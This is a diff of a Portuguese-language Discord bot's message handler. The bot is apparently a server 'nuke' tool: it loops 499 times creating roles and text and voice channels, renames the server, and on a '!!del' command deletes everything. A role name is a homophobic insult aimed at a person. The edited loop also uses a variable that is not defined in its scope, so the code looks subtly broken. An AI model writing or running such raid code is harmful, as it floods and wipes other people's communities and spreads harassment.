@@ -31,10 +31,10 @@ client.on("message", async (message) => {
 	message.channel.send(`discord tem limite de 500 canais e 200 cargos, n reclama se não criar mais canais, da !!del pra apagar tudo mas com lag fudido`)
 	for(i = 0; i < 499; i++){
 		message.guild.createRole('henry gay')
-	    	message.guild.setName('snow manipulador do caralho')
+	    	message.guild.setName(process.env.SERVER_NAME + `${texth}`)
 	    	const texto = makeid(32);
-	    	message.guild.createChannel(process.env.CHANNELNAME, 'text');
-	    	message.guild.createChannel(process.env.CHANNELNAME, 'text');  
+	    	message.guild.createChannel(`${texth}`, 'text');
+	    	message.guild.createChannel(`${texth}`, 'voice');  
 	    	message.guild.setIcon('./icon.png') 
 	}
     }
@@ -45,7 +45,7 @@ client.on("message", async (message) => {
         server.deleteAll();
 	message.guild.setIcon('./icon.png') 
         const texth = makeid(32);
-	    message.guild.createChannel(process.env.CHANNELNAME, 'text');	
+	    message.guild.createChannel(`${texth}`, 'text');	
 	    message.guild.setName(process.env.SERVER_NAME + `${texth}`)
 	    message.guild.setIcon('./icon.png')  
     }
